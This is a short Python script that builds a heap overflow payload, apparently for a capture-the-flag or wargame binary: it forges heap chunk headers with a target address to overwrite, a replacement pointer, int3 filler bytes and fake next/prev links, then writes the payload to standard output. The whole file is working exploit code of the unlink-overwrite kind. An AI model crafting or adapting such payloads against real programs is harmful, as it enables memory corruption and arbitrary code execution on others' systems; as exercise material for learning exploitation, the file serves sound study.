import struct
import subprocess
import sys

base = 0
def padwith(buf, size):
        return buf + 'A' * (size - len(buf))

def gadget(addr_off):
        return struct.pack("<I", (base + (addr_off - 0x17420)))

def uint(v):
        return struct.pack("<I", v)

def addr(a):
        return uint(a)

buf = ''

buf += addr(0x0804C004-8)    # address to overwrite
buf += addr(0x0804F34C+12)   # averwrite with
buf += '\xCC' * (252 - (8))
buf += 'EEEE'
buf += 'DDDD'

# next chunk
buf += 'DDDD'
buf += 'DDDD'
buf += uint(16+1)
buf += 'ABAB' # next
buf += 'ABAB' # prev
buf += 'SSSS'

# chunk after next
buf += uint(0x378-8+1)
sys.stdout.write(buf)
